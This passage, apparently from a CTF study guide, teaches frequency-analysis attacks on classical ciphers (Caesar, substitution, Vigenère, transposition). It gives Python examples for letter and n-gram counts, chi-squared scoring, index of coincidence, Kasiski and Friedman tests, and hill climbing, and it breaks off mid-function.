- Rainbow table generation and storage optimization
- GPU vs CPU performance characteristics for different hash types
- Salted hash cracking techniques and strategies
- Hash collision exploitation (MD5, SHA-1)
- Custom hash format identification and extraction from application databases

---

# CRYPTANALYSIS TECHNIQUES

## Frequency Analysis

### Overview and Cryptanalytic Context

Frequency analysis is the study of the frequency of letters, groups of letters, or patterns in ciphertext to break classical substitution ciphers. This technique exploits the non-uniform distribution of letters in natural language text. In CTF contexts, frequency analysis is primarily used against monoalphabetic substitution ciphers, Caesar ciphers, Vigenère variants, and transposition ciphers.

**Core principle**: Natural languages have predictable statistical patterns that persist through substitution-based encryption.

### Letter Frequency Distribution

Letter frequency distribution analyzes individual character occurrence rates in ciphertext and compares them to known language statistics.

**English letter frequency (approximate percentages):**

```
E: 12.70%    T: 9.06%     A: 8.17%     O: 7.51%     I: 6.97%
N: 6.75%     S: 6.33%     H: 6.09%     R: 5.99%     D: 4.25%
L: 4.03%     C: 2.78%     U: 2.76%     M: 2.41%     W: 2.36%
F: 2.23%     G: 2.02%     Y: 1.97%     P: 1.93%     B: 1.29%
V: 0.98%     K: 0.77%     J: 0.15%     X: 0.15%     Q: 0.10%
Z: 0.07%
```

**Basic frequency analysis with Python:**

```python
#!/usr/bin/env python3
from collections import Counter
import string

def analyze_frequency(ciphertext):
    """Calculate letter frequency in ciphertext"""
    # Normalize: uppercase, remove non-letters
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    total = len(text)
    
    if total == 0:
        return {}
    
    # Count occurrences
    freq = Counter(text)
    
    # Convert to percentages
    freq_percent = {char: (count / total) * 100 
                    for char, count in freq.items()}
    
    # Sort by frequency
    sorted_freq = sorted(freq_percent.items(), 
                        key=lambda x: x[1], 
                        reverse=True)
    
    return sorted_freq

# Example usage
ciphertext = "WKLV LV D VHFUHW PHVVDJH"
freq = analyze_frequency(ciphertext)

print("Letter Frequency Analysis:")
for char, percent in freq:
    print(f"{char}: {percent:.2f}%")
```

**Command-line frequency analysis:**

```bash
# Basic frequency count with grep
cat ciphertext.txt | tr -d ' \n' | grep -o . | sort | uniq -c | sort -rn

# More detailed with awk
cat ciphertext.txt | tr '[:lower:]' '[:upper:]' | \
    grep -o . | grep '[A-Z]' | sort | uniq -c | \
    awk '{printf "%s: %.2f%%\n", $2, ($1/total)*100}' total=$(cat ciphertext.txt | tr -cd 'A-Za-z' | wc -c)

# Using frequency analysis tools
# Install: pip3 install frequency-analysis
frequency-analysis -f ciphertext.txt

# Dcode.fr cipher identifier (offline tool)
# [Unverified] Online version available at dcode.fr
```

**Automated Caesar cipher breaking:**

```python
#!/usr/bin/env python3
from collections import Counter

def caesar_break_frequency(ciphertext):
    """Break Caesar cipher using frequency analysis"""
    # Expected frequency of 'E' in English
    ENGLISH_FREQ = {'E': 12.70, 'T': 9.06, 'A': 8.17}
    
    best_shift = 0
    best_score = float('inf')
    
    for shift in range(26):
        decrypted = ''
        for char in ciphertext.upper():
            if char.isalpha():
                decrypted += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            else:
                decrypted += char
        
        # Score based on 'E' frequency
        freq = Counter(decrypted)
        total = sum(freq.values())
        e_freq = (freq.get('E', 0) / total * 100) if total > 0 else 0
        
        # Chi-squared distance from expected
        score = abs(e_freq - ENGLISH_FREQ['E'])
        
        if score < best_score:
            best_score = score
            best_shift = shift
    
    return best_shift

# Example
ciphertext = "KHOOR ZRUOG"
shift = caesar_break_frequency(ciphertext)
print(f"Detected shift: {shift}")
# Decrypt with detected shift
```

**Substitution cipher frequency mapping:**

```python
#!/usr/bin/env python3
from collections import Counter

def frequency_substitution_attack(ciphertext):
    """Map ciphertext letters to plaintext using frequency"""
    # Expected English letter order by frequency
    ENGLISH_ORDER = "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    
    # Analyze ciphertext
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    freq = Counter(text)
    cipher_order = ''.join([char for char, _ in freq.most_common()])
    
    # Create substitution mapping
    mapping = {}
    for i, cipher_char in enumerate(cipher_order[:len(ENGLISH_ORDER)]):
        if i < len(ENGLISH_ORDER):
            mapping[cipher_char] = ENGLISH_ORDER[i]
    
    # Decrypt
    plaintext = ''
    for char in ciphertext.upper():
        if char in mapping:
            plaintext += mapping[char]
        elif char.isalpha():
            plaintext += '?'  # Unknown mapping
        else:
            plaintext += char
    
    return plaintext, mapping

# Example usage
cipher = "QEBKXDOB PROEV CLOW LRXP QEB IXWV ALD"
plain, mapping = frequency_substitution_attack(cipher)
print(f"Attempted decryption: {plain}")
print(f"Mapping: {mapping}")
```

### N-gram Analysis

N-gram analysis examines patterns of N consecutive characters (digrams/bigrams for N=2, trigrams for N=3, etc.) to identify common sequences.

**Common English digrams (bigrams):**

```
Most frequent: TH, HE, IN, ER, AN, RE, ON, AT, EN, ND
Common doubles: SS, EE, TT, FF, LL, MM, OO
```

**Common English trigrams:**

```
Most frequent: THE, AND, ING, HER, HAT, HIS, THA, ERE, FOR, ENT
```

**Bigram analysis implementation:**

```python
#!/usr/bin/env python3
from collections import Counter

def analyze_ngrams(text, n=2):
    """Extract and count n-grams from text"""
    # Normalize
    text = ''.join(c.upper() for c in text if c.isalpha())
    
    # Extract n-grams
    ngrams = [text[i:i+n] for i in range(len(text) - n + 1)]
    
    # Count frequencies
    freq = Counter(ngrams)
    total = len(ngrams)
    
    # Calculate percentages
    ngram_freq = {ng: (count / total) * 100 
                  for ng, count in freq.items()}
    
    return sorted(ngram_freq.items(), key=lambda x: x[1], reverse=True)

# Example
ciphertext = "WKLV LV D VHFUHW PHVVDJH ZLWK UHSHDWLQJ SDWWHUQV"
bigrams = analyze_ngrams(ciphertext, n=2)
trigrams = analyze_ngrams(ciphertext, n=3)

print("Top 10 Bigrams:")
for ng, freq in bigrams[:10]:
    print(f"{ng}: {freq:.2f}%")

print("\nTop 10 Trigrams:")
for ng, freq in trigrams[:10]:
    print(f"{ng}: {freq:.2f}%")
```

**English n-gram frequency reference:**

```python
# Reference frequencies for comparison
ENGLISH_BIGRAMS = {
    'TH': 3.56, 'HE': 3.07, 'IN': 2.43, 'ER': 2.05, 'AN': 1.99,
    'RE': 1.85, 'ON': 1.76, 'AT': 1.49, 'EN': 1.45, 'ND': 1.35,
    'TI': 1.34, 'ES': 1.34, 'OR': 1.28, 'TE': 1.20, 'OF': 1.17
}

ENGLISH_TRIGRAMS = {
    'THE': 3.51, 'AND': 1.59, 'ING': 1.21, 'HER': 0.82, 'HAT': 0.65,
    'HIS': 0.64, 'THA': 0.63, 'ERE': 0.62, 'FOR': 0.62, 'ENT': 0.61,
    'ION': 0.61, 'TER': 0.57, 'WAS': 0.57, 'YOU': 0.56, 'ITH': 0.54
}

def compare_ngrams(cipher_ngrams, reference_dict, top_n=10):
    """Compare ciphertext n-grams with English reference"""
    cipher_top = dict(cipher_ngrams[:top_n])
    
    print("Ciphertext vs English comparison:")
    for cipher_ng, cipher_freq in cipher_top.items():
        # Find most likely plaintext equivalent
        print(f"Cipher '{cipher_ng}' ({cipher_freq:.2f}%)")
```

**Vigenère cipher n-gram attack:**

```python
#!/usr/bin/env python3

def find_vigenere_key_length(ciphertext, max_length=20):
    """Use index of coincidence to find likely key length"""
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    
    def index_of_coincidence(s):
        """Calculate IC - measures how non-uniform text is"""
        freq = Counter(s)
        n = len(s)
        if n <= 1:
            return 0
        ic = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
        return ic
    
    # English IC ≈ 0.065-0.068, random text ≈ 0.038
    ENGLISH_IC = 0.0667
    
    scores = {}
    for key_len in range(1, max_length + 1):
        # Split into key_len groups
        groups = [''] * key_len
        for i, char in enumerate(text):
            groups[i % key_len] += char
        
        # Average IC across groups
        avg_ic = sum(index_of_coincidence(g) for g in groups) / key_len
        scores[key_len] = abs(avg_ic - ENGLISH_IC)
    
    # Best match has IC closest to English
    best_length = min(scores, key=scores.get)
    return best_length, scores

# Example
cipher = "LXFOPVEFRNHR"  # Vigenère encrypted
length, scores = find_vigenere_key_length(cipher, max_length=10)
print(f"Likely key length: {length}")
```

**Kasiski examination (repeated n-gram distances):**

```python
#!/usr/bin/env python3
from collections import defaultdict
from math import gcd
from functools import reduce

def kasiski_examination(ciphertext, ngram_size=3):
    """Find repeated n-grams and calculate distance GCD"""
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    
    # Find repeated n-grams and their positions
    ngram_positions = defaultdict(list)
    for i in range(len(text) - ngram_size + 1):
        ngram = text[i:i+ngram_size]
        ngram_positions[ngram].append(i)
    
    # Calculate distances between repetitions
    distances = []
    for ngram, positions in ngram_positions.items():
        if len(positions) > 1:
            for i in range(len(positions) - 1):
                dist = positions[i+1] - positions[i]
                distances.append(dist)
                print(f"'{ngram}' repeats at distance {dist}")
    
    if not distances:
        return None
    
    # Find GCD of all distances - likely key length or multiple
    key_length = reduce(gcd, distances)
    return key_length

# Example
cipher = "DAZSNHOHMFKLMFKLKWHNLFGIZEVPSLAABTNHOHMFKLQ"
likely_length = kasiski_examination(cipher)
print(f"\nLikely key length (or factor): {likely_length}")
```

### Chi-squared Test

Chi-squared test quantifies how closely ciphertext frequency distribution matches expected plaintext distribution.

**Chi-squared formula:**

```
χ² = Σ ((Observed - Expected)² / Expected)

Lower χ² value = better match to expected distribution
```

**Chi-squared implementation:**

```python
#!/usr/bin/env python3
from collections import Counter
import string

def chi_squared(text, expected_freq):
    """
    Calculate chi-squared statistic comparing text to expected frequencies
    
    expected_freq: dict of {'A': 8.17, 'B': 1.29, ...} (percentages)
    """
    # Normalize text
    text = ''.join(c.upper() for c in text if c.isalpha())
    total = len(text)
    
    if total == 0:
        return float('inf')
    
    # Observed frequencies
    observed = Counter(text)
    
    chi2 = 0.0
    for letter in string.ascii_uppercase:
        observed_count = observed.get(letter, 0)
        observed_freq = (observed_count / total) * 100
        
        expected = expected_freq.get(letter, 0)
        
        if expected > 0:
            chi2 += ((observed_freq - expected) ** 2) / expected
    
    return chi2

# English letter frequencies (percentages)
ENGLISH_FREQ = {
    'A': 8.17, 'B': 1.29, 'C': 2.78, 'D': 4.25, 'E': 12.70,
    'F': 2.23, 'G': 2.02, 'H': 6.09, 'I': 6.97, 'J': 0.15,
    'K': 0.77, 'L': 4.03, 'M': 2.41, 'N': 6.75, 'O': 7.51,
    'P': 1.93, 'Q': 0.10, 'R': 5.99, 'S': 6.33, 'T': 9.06,
    'U': 2.76, 'V': 0.98, 'W': 2.36, 'X': 0.15, 'Y': 1.97,
    'Z': 0.07
}

# Example: Test different decryption attempts
test_texts = [
    "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG",  # English
    "WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ",  # Caesar +3
    "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN"     # Random
]

for text in test_texts:
    score = chi_squared(text, ENGLISH_FREQ)
    print(f"Text: {text[:30]}...")
    print(f"Chi-squared: {score:.2f}\n")
```

**Automated Caesar cipher breaking with chi-squared:**

```python
#!/usr/bin/env python3

def break_caesar_chi2(ciphertext):
    """Break Caesar cipher by minimizing chi-squared"""
    best_shift = 0
    best_chi2 = float('inf')
    best_plaintext = ""
    
    for shift in range(26):
        # Decrypt with this shift
        plaintext = ""
        for char in ciphertext.upper():
            if char.isalpha():
                plaintext += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            else:
                plaintext += char
        
        # Calculate chi-squared
        chi2 = chi_squared(plaintext, ENGLISH_FREQ)
        
        if chi2 < best_chi2:
            best_chi2 = chi2
            best_shift = shift
            best_plaintext = plaintext
    
    return best_shift, best_plaintext, best_chi2

# Example
cipher = "KHOOR ZRUOG! WKLV LV D WHVW PHVVDJH."
shift, plain, score = break_caesar_chi2(cipher)
print(f"Best shift: {shift}")
print(f"Chi-squared: {score:.2f}")
print(f"Plaintext: {plain}")
```

**Substitution cipher scoring:**

```python
#!/usr/bin/env python3
import string
import random

def score_substitution(ciphertext, mapping):
    """Score a substitution mapping using chi-squared"""
    decrypted = ""
    for char in ciphertext.upper():
        if char in mapping:
            decrypted += mapping[char]
        else:
            decrypted += char
    
    return chi_squared(decrypted, ENGLISH_FREQ)

def hill_climbing_substitution(ciphertext, max_iterations=10000):
    """
    Break substitution cipher using hill climbing with chi-squared scoring
    [Inference] May not find global optimum, multiple runs recommended
    """
    # Start with random mapping
    letters = list(string.ascii_uppercase)
    shuffled = letters.copy()
    random.shuffle(shuffled)
    mapping = dict(zip(letters, shuffled))
    
    current_score = score_substitution(ciphertext, mapping)
    best_mapping = mapping.copy()
    best_score = current_score
    
    for iteration in range(max_iterations):
        # Random swap
        a, b = random.sample(letters, 2)
        mapping[a], mapping[b] = mapping[b], mapping[a]
        
        new_score = score_substitution(ciphertext, mapping)
        
        # Accept if better
        if new_score < current_score:
            current_score = new_score
            if new_score < best_score:
                best_score = new_score
                best_mapping = mapping.copy()
        else:
            # Revert swap
            mapping[a], mapping[b] = mapping[b], mapping[a]
        
        # Early exit if very good match
        if best_score < 50:  # Threshold for "good enough"
            break
    
    return best_mapping, best_score

# Example
cipher = "QEBKXDOB PROEV CLOW LRXP QEB IXWV ALD"
mapping, score = hill_climbing_substitution(cipher)
print(f"Best mapping found (score: {score:.2f}):")
print(mapping)

decrypted = ''.join(mapping.get(c, c) for c in cipher)
print(f"Decrypted: {decrypted}")
```

### English Language Statistics

Comprehensive English language statistics for cryptanalysis.

**Letter frequency data structure:**

```python
# Comprehensive English statistics
ENGLISH_STATS = {
    'letter_freq': {
        'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97,
        'N': 6.75, 'S': 6.33, 'H': 6.09, 'R': 5.99, 'D': 4.25,
        'L': 4.03, 'C': 2.78, 'U': 2.76, 'M': 2.41, 'W': 2.36,
        'F': 2.23, 'G': 2.02, 'Y': 1.97, 'P': 1.93, 'B': 1.29,
        'V': 0.98, 'K': 0.77, 'J': 0.15, 'X': 0.15, 'Q': 0.10,
        'Z': 0.07
    },
    
    'bigram_freq': {
        'TH': 3.56, 'HE': 3.07, 'IN': 2.43, 'ER': 2.05, 'AN': 1.99,
        'RE': 1.85, 'ON': 1.76, 'AT': 1.49, 'EN': 1.45, 'ND': 1.35,
        'TI': 1.34, 'ES': 1.34, 'OR': 1.28, 'TE': 1.20, 'OF': 1.17,
        'ED': 1.17, 'IS': 1.13, 'IT': 1.12, 'AL': 1.09, 'AR': 1.07
    },
    
    'trigram_freq': {
        'THE': 3.51, 'AND': 1.59, 'ING': 1.21, 'HER': 0.82, 'HAT': 0.65,
        'HIS': 0.64, 'THA': 0.63, 'ERE': 0.62, 'FOR': 0.62, 'ENT': 0.61,
        'ION': 0.61, 'TER': 0.57, 'WAS': 0.57, 'YOU': 0.56, 'ITH': 0.54,
        'VER': 0.53, 'ALL': 0.52, 'WIT': 0.51, 'THI': 0.51, 'TIO': 0.50
    },
    
    'double_letters': ['SS', 'EE', 'TT', 'FF', 'LL', 'MM', 'OO'],
    
    'common_words': {
        1: ['A', 'I'],
        2: ['OF', 'TO', 'IN', 'IT', 'IS', 'BE', 'AS', 'AT', 'SO', 'WE'],
        3: ['THE', 'AND', 'FOR', 'ARE', 'BUT', 'NOT', 'YOU', 'ALL', 'CAN', 'HER']
    },
    
    'index_of_coincidence': 0.0667  # For English text
}
```

**Word pattern matching:**

```python
#!/usr/bin/env python3

def get_word_pattern(word):
    """
    Convert word to pattern (e.g., 'HELLO' -> '0.1.2.2.3')
    Useful for identifying words in substitution ciphers
    """
    word = word.upper()
    pattern = []
    char_map = {}
    next_num = 0
    
    for char in word:
        if char not in char_map:
            char_map[char] = str(next_num)
            next_num += 1
        pattern.append(char_map[char])
    
    return '.'.join(pattern)

def load_pattern_dictionary(wordlist_path='/usr/share/dict/words'):
    """Build dictionary of patterns to possible words"""
    patterns = {}
    
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                word = line.strip().upper()
                if word.isalpha():
                    pattern = get_word_pattern(word)
                    if pattern not in patterns:
                        patterns[pattern] = []
                    patterns[pattern].append(word)
    except FileNotFoundError:
        # Fallback to common words
        common = ['THE', 'AND', 'FOR', 'ARE', 'BUT', 'NOT', 'YOU', 'ALL']
        for word in common:
            pattern = get_word_pattern(word)
            patterns[pattern] = [word]
    
    return patterns

def find_matching_words(cipher_word, pattern_dict):
    """Find plaintext words matching cipher word pattern"""
    pattern = get_word_pattern(cipher_word)
    return pattern_dict.get(pattern, [])

# Example
pattern_dict = load_pattern_dictionary()

cipher_words = ['KHOOR', 'ZRUOG', 'WKDW']
for cw in cipher_words:
    matches = find_matching_words(cw, pattern_dict)
    print(f"{cw} (pattern {get_word_pattern(cw)}): {matches[:10]}")
```

**Dictionary attack with frequency scoring:**

```python
#!/usr/bin/env python3

def dictionary_score(text, dictionary_path='/usr/share/dict/words'):
    """
    Score text by counting valid English words
    Higher score = more likely correct plaintext
    """
    try:
        with open(dictionary_path, 'r') as f:
            dictionary = set(word.strip().upper() for word in f)
    except FileNotFoundError:
        # Minimal dictionary
        dictionary = set(['THE', 'AND', 'FOR', 'ARE', 'BUT', 'NOT', 
                         'YOU', 'ALL', 'CAN', 'HER', 'WAS', 'ONE'])
    
    words = text.upper().split()
    valid_words = sum(1 for word in words if word in dictionary)
    
    return valid_words / len(words) if words else 0

def combined_score(text):
    """
    Combine multiple scoring methods for robust plaintext detection
    Lower score = more likely correct
    """
    # Chi-squared (lower is better)
    chi2 = chi_squared(text, ENGLISH_FREQ)
    
    # Dictionary score (higher is better, so invert)
    dict_score = dictionary_score(text)
    dict_penalty = (1 - dict_score) * 100
    
    # Combined score (weighted)
    combined = (chi2 * 0.7) + (dict_penalty * 0.3)
    
    return combined

# Example: Compare decryption candidates
candidates = [
    "HELLO WORLD THIS IS A TEST MESSAGE",
    "IFMMP XPSME UIJT JT B UFTU NFTTBHF",
    "ABCDE FGHIJ KLMN OP Q RSTU VWXYZAB"
]

for text in candidates:
    score = combined_score(text)
    print(f"{text[:30]}: {score:.2f}")
```

**Index of Coincidence (IC) calculation:**

```python
#!/usr/bin/env python3
from collections import Counter

def index_of_coincidence(text):
    """
    Calculate IC - measures how non-random text is
    
    English: ~0.065-0.068
    Random: ~0.038
    Polyalphabetic cipher: closer to random
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    n = len(text)
    
    if n <= 1:
        return 0
    
    freq = Counter(text)
    ic = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
    
    return ic

def mutual_ic(text1, text2):
    """
    Calculate mutual IC between two texts
    Useful for Vigenère key-length detection
    """
    text1 = ''.join(c.upper() for c in text1 if c.isalpha())
    text2 = ''.join(c.upper() for c in text2 if c.isalpha())
    
    n1, n2 = len(text1), len(text2)
    if n1 == 0 or n2 == 0:
        return 0
    
    freq1 = Counter(text1)
    freq2 = Counter(text2)
    
    mic = 0
    for char in string.ascii_uppercase:
        mic += freq1.get(char, 0) * freq2.get(char, 0)
    
    mic /= (n1 * n2)
    return mic

# Example
english_text = "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG"
random_text = "XMCKL QJWPU VBZRA HIGF SDOTE NYRE"
vigenere_text = "LXFOPVEFRNHR"

print(f"English IC: {index_of_coincidence(english_text):.4f}")
print(f"Random IC: {index_of_coincidence(random_text):.4f}")
print(f"Vigenère IC: {index_of_coincidence(vigenere_text):.4f}")
```

### Practical CTF Frequency Analysis Workflow

**Comprehensive cipher breaking script:**

```python
#!/usr/bin/env python3
import string
from collections import Counter

def analyze_cipher(ciphertext):
    """Complete frequency analysis workflow"""
    
    print("=" * 60)
    print("FREQUENCY ANALYSIS REPORT")
    print("=" * 60)
    
    # 1. Basic statistics
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    print(f"\nText length: {len(text)} characters")
    
    # 2. Letter frequency
    print("\n--- LETTER FREQUENCY ---")
    freq = analyze_frequency(ciphertext)
    for char, percent in freq[:10]:
        print(f"{char}: {percent:.2f}%")
    
    # 3. Index of Coincidence
    ic = index_of_coincidence(text)
    print(f"\n--- INDEX OF COINCIDENCE ---")
    print(f"IC: {ic:.4f}")
    if ic > 0.060:
        print("[Inference] Likely monoalphabetic (Caesar/Substitution)")
    else:
        print("[Inference] Likely polyalphabetic (Vigenère) or transposition")
    
    # 4. Bigram analysis
    print("\n--- TOP BIGRAMS ---")
    bigrams = analyze_ngrams(text, 2)
    for bg, freq in bigrams[:10]:
        print(f"{bg}: {freq:.2f}%")
    
    # 5. Trigram analysis
    print("\n--- TOP TRIGRAMS ---")
    trigrams = analyze_ngrams(text, 3)
    for tg, freq in trigrams[:10]:
        print(f"{tg}: {freq:.2f}%")
    
    # 6. Pattern detection
    print("\n--- REPEATED PATTERNS ---")
    for ng_size in [3, 4, 5]:
        ngrams = [text[i:i+ng_size] for i in range(len(text) - ng_size + 1)]
        repeats = {ng: count for ng, count in Counter(ngrams).items() if count > 1}
        if repeats:
            print(f"{ng_size}-grams: {dict(sorted(repeats.items(), key=lambda x: x[1], reverse=True)[:5])}")
    
    # 7. Suggested attack
    print("\n--- SUGGESTED ATTACKS ---")
    if ic > 0.060:
        print("1. Caesar cipher breaking (if IC > 0.065)")
        print("2. Substitution cipher with hill climbing")
        print("3. Affine cipher testing")
    elif 0.045 < ic < 0.060:
        print("1. Vigenère cipher - find key length")
        print("2. Autokey cipher analysis")
        print("3. Running key cipher detection")
    else:
        print("1. Transposition cipher (columnar, rail fence)")
        print("2. Complex polyalphabetic cipher")
        print("3. Modern cipher or random data")
    
    return {
        'ic': ic,
        'letter_freq': freq,
        'bigrams': bigrams[:10],
        'trigrams': trigrams[:10]
    }

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        with open(sys.argv[1], 'r') as f:
            ciphertext = f.read()
    else:
        ciphertext = "KHOOR ZRUOG WKLV LV D WHVW PHVVDJH"
    
    results = analyze_cipher(ciphertext)
```

**Automated multi-method breaking tool:**

```python
#!/usr/bin/env python3

def auto_break_cipher(ciphertext, verbose=False):
    """
    Attempt multiple breaking methods and return best result
    [Unverified] Success depends on cipher type and text length
    """
    results = []
    
    # Method 1: Caesar brute force
    if verbose:
        print("[*] Trying Caesar cipher...")
    
    for shift in range(26):
        plaintext = ""
        for char in ciphertext.upper():
            if char.isalpha():
                plaintext += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
            else:
                plaintext += char
        
        score = combined_score(plaintext)
        results.append({
            'method': 'Caesar',
            'key': shift,
            'plaintext': plaintext,
            'score': score
        })
    
    # Method 2: ROT13 (Caesar shift 13)
    if verbose:
        print("[*] Trying ROT13...")
    
    rot13 = ""
    for char in ciphertext:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            rot13 += chr((ord(char) - base + 13) % 26 + base)
        else:
            rot13 += char
    
    results.append({
        'method': 'ROT13',
        'key': 13,
        'plaintext': rot13,
        'score': combined_score(rot13)
    })
    
    # Method 3: Atbash (A↔Z, B↔Y, etc.)
    if verbose:
        print("[*] Trying Atbash...")
    
    atbash = ""
    for char in ciphertext.upper():
        if char.isalpha():
            atbash += chr(ord('Z') - (ord(char) - ord('A')))
        else:
            atbash += char
    
    results.append({
        'method': 'Atbash',
        'key': 'reverse',
        'plaintext': atbash,
        'score': combined_score(atbash)
    })
    
    # Method 4: Simple substitution with frequency
    if verbose:
        print("[*] Trying frequency-based substitution...")
    
    mapping, sub_score = hill_climbing_substitution(ciphertext, max_iterations=5000)
    sub_plaintext = ''.join(mapping.get(c.upper(), c) for c in ciphertext)
    
    results.append({
        'method': 'Substitution',
        'key': mapping,
        'plaintext': sub_plaintext,
        'score': sub_score
    })
    
    # Sort by score (lower is better)
    results.sort(key=lambda x: x['score'])
    
    # Return top 5 results
    return results[:5]

# Example usage
cipher = "KHOOR ZRUOG! WKLV LV D VHFUHW PHVVDJH."
results = auto_break_cipher(cipher, verbose=True)

print("\n" + "=" * 60)
print("TOP DECRYPTION CANDIDATES")
print("=" * 60)

for i, result in enumerate(results, 1):
    print(f"\n#{i} - {result['method']} (Score: {result['score']:.2f})")
    print(f"Key: {result['key']}")
    print(f"Plaintext: {result['plaintext'][:80]}")
```

### Advanced Statistical Techniques

**Entropy calculation:**

```python
#!/usr/bin/env python3
import math
from collections import Counter

def shannon_entropy(text):
    """
    Calculate Shannon entropy - measures randomness
    
    Low entropy (< 3.5): Likely meaningful text or simple cipher
    Medium entropy (3.5-4.5): Complex cipher or compressed data
    High entropy (> 4.5): Random data or strong encryption
    
    [Inference] Entropy alone cannot definitively identify cipher type
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    n = len(text)
    
    if n == 0:
        return 0
    
    freq = Counter(text)
    entropy = 0
    
    for count in freq.values():
        p = count / n
        entropy -= p * math.log2(p)
    
    return entropy

def calculate_redundancy(text):
    """
    Calculate redundancy - how much information is predictable
    English has ~75% redundancy
    """
    entropy = shannon_entropy(text)
    max_entropy = math.log2(26)  # For 26 letters
    redundancy = (1 - (entropy / max_entropy)) * 100
    
    return redundancy

# Example
texts = {
    'English': "THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG",
    'Caesar': "KHOOR ZRUOG WKLV LV D WHVW",
    'Random': "XMCKL QJWPU VBZRA HIGFS",
    'Repeated': "AAAAA BBBBB CCCCC DDDDD"
}

print("Entropy Analysis:")
for name, text in texts.items():
    ent = shannon_entropy(text)
    red = calculate_redundancy(text)
    print(f"{name:15} Entropy: {ent:.3f}, Redundancy: {red:.1f}%")
```

**Friedman test for key length:**

```python
#!/usr/bin/env python3

def friedman_test(ciphertext):
    """
    Estimate Vigenère key length using Friedman test
    Based on Index of Coincidence
    """
    text = ''.join(c.upper() for c in ciphertext if c.isalpha())
    n = len(text)
    
    if n == 0:
        return None
    
    # Calculate observed IC
    ic_observed = index_of_coincidence(text)
    
    # Expected IC for English
    ic_english = 0.0667
    
    # Expected IC for random text (26 letters)
    ic_random = 1.0 / 26
    
    # Friedman's formula for key length
    # k_p = (ic_english - ic_random) / (ic_observed - ic_random)
    
    if ic_observed <= ic_random:
        return None  # Formula doesn't apply
    
    key_length = (ic_english - ic_random) / (ic_observed - ic_random)
    
    return round(key_length)

# Example
vigenere_cipher = "LXFOPVEFRNHR"
estimated_length = friedman_test(vigenere_cipher)
print(f"Estimated Vigenère key length: {estimated_length}")
```

**Autocorrelation for transposition detection:**

```python
#!/usr/bin/env python3

def autocorrelation(text, shift):
    """
    Calculate autocorrelation - measures similarity when text shifted
    High autocorrelation at certain shifts suggests columnar transposition
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    n = len(text)
    
    if shift >= n or shift <= 0:
        return 0
    
    matches = 0
    for i in range(n - shift):
        if text[i] == text[i + shift]:
            matches += 1
    
    correlation = matches / (n - shift)
    return correlation

def find_transposition_width(ciphertext, max_width=20):
    """
    Find likely column width for columnar transposition
    [Inference] Peaks in autocorrelation suggest column width
    """
    results = {}
    
    for width in range(2, max_width + 1):
        corr = autocorrelation(ciphertext, width)
        results[width] = corr
    
    # Find peaks (local maxima)
    peaks = []
    widths = sorted(results.keys())
    
    for i in range(1, len(widths) - 1):
        w = widths[i]
        if results[w] > results[widths[i-1]] and results[w] > results[widths[i+1]]:
            peaks.append((w, results[w]))
    
    return sorted(peaks, key=lambda x: x[1], reverse=True)

# Example
transposition_cipher = "HLOOLELWRDLO"
peaks = find_transposition_width(transposition_cipher)
print("Likely column widths (autocorrelation peaks):")
for width, corr in peaks[:5]:
    print(f"Width {width}: correlation {corr:.4f}")
```

**Quadgram scoring (4-gram frequency):**

```python
#!/usr/bin/env python3
import math

def load_quadgram_freq(filepath='english_quadgrams.txt'):
    """
    Load quadgram frequencies from file
    [Unverified] File must contain quadgram frequency data
    
    Format: TION 0.0061
            NTHE 0.0057
    """
    quadgrams = {}
    total = 0
    
    try:
        with open(filepath, 'r') as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) == 2:
                    quad, freq = parts[0], float(parts[1])
                    quadgrams[quad] = freq
                    total += freq
    except FileNotFoundError:
        # Fallback to minimal set
        quadgrams = {
            'TION': 0.0061, 'NTHE': 0.0057, 'THER': 0.0036,
            'THAT': 0.0033, 'OFTH': 0.0030, 'FTHE': 0.0030
        }
        total = sum(quadgrams.values())
    
    # Convert to log probabilities
    for quad in quadgrams:
        quadgrams[quad] = math.log10(quadgrams[quad] / total)
    
    return quadgrams

def quadgram_score(text, quadgram_dict, floor=-10):
    """
    Score text using quadgram frequencies
    Higher score = more English-like
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    score = 0
    
    for i in range(len(text) - 3):
        quad = text[i:i+4]
        score += quadgram_dict.get(quad, floor)
    
    return score

# Example usage
quadgrams = load_quadgram_freq()

texts = [
    "THIS IS AN ENGLISH SENTENCE WITH COMMON WORDS",
    "WKLV LV DQ HQJOLVK VHQWHQFH ZLWK FRPPRQ ZRUGV",
    "XMCK QJWP VBZR AHIG FSDO TEYN RELO"
]

for text in texts:
    score = quadgram_score(text, quadgrams)
    print(f"{text[:40]}: {score:.2f}")
```

### Visualization Tools

**Frequency distribution chart:**

```python
#!/usr/bin/env python3

def plot_frequency_comparison(ciphertext, output='freq_chart.txt'):
    """
    Create ASCII bar chart comparing cipher vs English frequencies
    """
    cipher_freq = dict(analyze_frequency(ciphertext))
    
    print("Letter Frequency Comparison")
    print("=" * 60)
    print(f"{'Letter':<8} {'Cipher %':<12} {'English %':<12} {'Bars'}")
    print("-" * 60)
    
    for letter in sorted(ENGLISH_FREQ.keys()):
        cipher_pct = cipher_freq.get(letter, 0)
        english_pct = ENGLISH_FREQ[letter]
        
        # Create bar chart (scale to 40 chars max)
        cipher_bar = '#' * int(cipher_pct * 3)
        english_bar = '.' * int(english_pct * 3)
        
